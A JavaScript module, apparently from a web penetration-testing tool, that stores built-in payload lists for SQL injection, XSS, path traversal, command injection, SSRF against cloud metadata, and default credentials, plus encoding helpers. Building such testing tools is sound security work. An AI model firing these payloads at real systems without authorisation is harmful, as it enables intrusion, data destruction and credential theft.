// Payload Engine – Manages payload sets for Intruder attacks
export class PayloadEngine {

    // Built-in payloads for common security tests
    static BUILT_IN = {
        'SQL Injection': [
            `'`, `''`, `"`, `1 OR 1=1`, `1; DROP TABLE users--`,
            `' OR '1'='1`, `admin'--`, `' UNION SELECT NULL--`,
            `'; WAITFOR DELAY '0:0:5'--`, `1 AND SLEEP(5)`
        ],
        'XSS Basic': [
            `<script>alert(1)</script>`,
            `"><script>alert(1)</script>`,
            `<img src=x onerror=alert(1)>`,
            `<svg onload=alert(1)>`,
            `javascript:alert(1)`,
            `"><img src=x onerror=alert(document.cookie)>`,
            `';alert(String.fromCharCode(88,83,83))//`
        ],
        'Path Traversal': [
            `../`, `../../`, `../../../etc/passwd`,
            `..%2F..%2F..%2Fetc%2Fpasswd`,
            `....//....//etc/passwd`,
            `/etc/passwd`, `/etc/shadow`, `C:\\Windows\\System32\\drivers\\etc\\hosts`
        ],
        'Command Injection': [
            `; ls`, `| ls`, `&& ls`, `; id`, `| id`,
            `$(id)`, `` `id` ``, `; cat /etc/passwd`, `|| id`
        ],
        'Fuzzing': [
            ``, `null`, `undefined`, `true`, `false`, `0`, `-1`, `9999999`,
            `%00`, `%0a`, `%0d`, `' OR 1--`, `<>{}|\\^`, `../`
        ],
        'Common Passwords': [
            `password`, `123456`, `admin`, `root`, `qwerty`,
            `letmein`, `Password1`, `welcome`, `monkey`, `dragon`
        ],
        'Common Usernames': [
            `admin`, `root`, `user`, `test`, `guest`,
            `administrator`, `superuser`, `info`, `support`, `webmaster`
        ],
        'SSRF': [
            `http://localhost`, `http://127.0.0.1`, `http://0.0.0.0`,
            `http://169.254.169.254/latest/meta-data/`,
            `http://[::1]`, `http://2130706433`,
            `http://0177.0.0.1`, `http://localhost:8080/admin`
        ]
    };

    static getBuiltInNames() {
        return Object.keys(this.BUILT_IN);
    }

    static getBuiltIn(name) {
        return this.BUILT_IN[name] || [];
    }

    // Parse payload list from raw text (newline separated)
    static parseList(text) {
        return text.split('\n')
            .map(l => l.trim())
            .filter(l => l.length > 0);
    }

    // Generate numeric range payloads
    static numericRange(from, to, step = 1) {
        const payloads = [];
        for (let i = from; i <= to; i += step) {
            payloads.push(String(i));
        }
        return payloads;
    }

    // Generate character substitution payloads (case variations)
    static caseVariations(word) {
        const variations = [word, word.toUpperCase(), word.toLowerCase(),
            word.charAt(0).toUpperCase() + word.slice(1).toLowerCase()];
        return [...new Set(variations)];
    }

    // URL-encode a payload
    static urlEncode(payload) {
        return encodeURIComponent(payload);
    }

    // Double URL-encode
    static doubleUrlEncode(payload) {
        return encodeURIComponent(encodeURIComponent(payload));
    }

    // Base64 encode
    static base64Encode(payload) {
        return btoa(unescape(encodeURIComponent(payload)));
    }

    // Apply transform to all payloads in a set
    static transform(payloads, type) {
        switch (type) {
            case 'url_encode': return payloads.map(this.urlEncode);
            case 'double_url_encode': return payloads.map(this.doubleUrlEncode);
            case 'base64': return payloads.map(this.base64Encode);
            case 'lowercase': return payloads.map(p => p.toLowerCase());
            case 'uppercase': return payloads.map(p => p.toUpperCase());
            default: return payloads;
        }
    }
}
